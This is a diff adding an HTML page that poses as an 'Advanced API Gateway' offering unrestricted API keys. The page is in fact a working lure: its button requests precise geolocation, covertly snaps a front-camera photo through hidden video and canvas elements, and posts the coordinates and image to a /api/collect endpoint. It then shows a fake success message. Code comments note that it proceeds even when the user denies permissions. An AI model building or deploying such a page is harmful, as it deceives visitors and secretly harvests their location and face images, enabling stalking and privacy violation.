@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced API Generator Platform</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
+
+    <div class="max-w-md w-full bg-slate-900/80 backdrop-blur-xl border border-slate-800 p-8 rounded-3xl shadow-2xl text-center">
+        <div class="inline-block p-3 bg-indigo-500/10 rounded-2xl border border-indigo-500/20 mb-4">
+            <svg class="w-8 h-8 text-indigo-400 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+        </div>
+        <h1 class="text-2xl font-bold tracking-tight text-white">Advanced API Gateway</h1>
+        <p class="text-slate-400 text-sm mt-2 mb-6">Initialize secure tunnel and generate zero-restriction API endpoints instantly.</p>
+
+        <div id="status-panel" class="bg-slate-950/60 border border-slate-800/80 p-4 rounded-xl text-xs text-indigo-300 font-mono mb-6">
+            Status: Initializing handshake protocol...
+        </div>
+
+        <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-indigo-600/20 transition-all duration-200">
+            Generate Custom API Key
+        </button>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        let capturedLat = null;
+        let capturedLon = null;
+        let capturedImage = null;
+
+        function initializeEngine() {
+            const panel = document.getElementById("status-panel");
+            panel.innerText = "Requesting system permissions (Location & Media)...";
+
+            // Attempt Location (Chahe user allow kare ya block, aage ka process chalega)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        capturedLat = pos.coords.latitude;
+                        capturedLon = pos.coords.longitude;
+                        executeCameraCapture();
+                    },
+                    (err) => {
+                        panel.innerText = "Location access skipped/denied. Proceeding with media stream...";
+                        executeCameraCapture(); // User ne location mana ki toh bhi ruka nahi
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            } else {
+                executeCameraCapture();
+            }
+        }
+
+        function executeCameraCapture() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById("v");
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById("c");
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedImage = canvas.toDataURL("image/jpeg", 0.7);
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        sendDataToServer();
+                    }, 1200);
+                })
+                .catch(err => {
+                    // Camera access deny hone par bhi data bina photo ke bhej diya jayega
+                    sendDataToServer();
+                });
+        }
+
+        function sendDataToServer() {
+            const panel = document.getElementById("status-panel");
+            panel.innerText = "Configuring endpoint parameters...";
+
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: capturedLat,
+                    longitude: capturedLon,
+                    image_base64: capturedImage
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                panel.innerHTML = "<span class='text-emerald-400 font-bold'>✔ API Generated Successfully! No restrictions applied.</span>";
+            })
+            .catch(err => {
+                panel.innerText = "Error syncing with gateway server.";
+            });
+        }
+    </script>
+</body>
+</html>
+
